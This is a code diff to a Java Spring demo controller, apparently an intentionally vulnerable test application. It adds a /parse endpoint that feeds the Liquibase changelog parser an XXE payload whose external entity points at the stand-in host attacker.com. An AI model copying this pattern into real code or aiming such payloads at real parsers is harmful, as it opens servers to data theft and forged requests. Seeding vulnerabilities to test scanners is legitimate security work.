@@ -6,10 +6,18 @@ import com.github.pagehelper.Page;
 
 //import org.apache.hadoop.util.Shell.ShellCommandExecutor;
 import org.codehaus.plexus.util.cli.Commandline;
+import org.ho.yaml.Yaml;
+
 import com.github.pagehelper.PageHelper;
 import com.jd.sec_api.SecApi;
+
+import liquibase.changelog.ChangeLogParameters;
+import liquibase.parser.core.xml.XMLChangeLogSAXParser;
+import liquibase.sdk.resource.MockResourceAccessor;
+
 import org.slf4j.ext.EventData;
 import org.springframework.boot.autoconfigure.batch.BatchProperties.Job;
+import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
@@ -183,7 +191,27 @@ public class DemoController {
             return "Exception during deserialization: " + e.getMessage();
         }
     }
+    @GetMapping("/parse")
+    public String parseXml() {
+        // Example XML string that could be used to exploit XXE
+        String xmlInput = "<!DOCTYPE root [\n" +
+                "  <!ENTITY % external SYSTEM \"http://attacker.com\">\n" +
+                "%external;\n" +
+                "]>\n" +
+                "<root/>\n";
 
+        XMLChangeLogSAXParser parser = new XMLChangeLogSAXParser();
+        HashMap hashMap = new HashMap<String, String>();
+        hashMap.put("xxe.xml", xmlInput);
+        MockResourceAccessor ra = new MockResourceAccessor(hashMap);
+
+        try {
+            parser.parse("xxe.xml", new ChangeLogParameters(), ra);
+            return "XML parsed successfully";
+        } catch (Exception e) {
+            return "Error parsing XML: " + e.getMessage();
+        }
+    }
     @RequestMapping(path = "/permit/{value}")
     public String permit(@PathVariable final String value) throws FileNotFoundException, IOException {
         // String safe = SecApi.encoder().encodeForSQL(MySQLCodec.getInstance(), value);
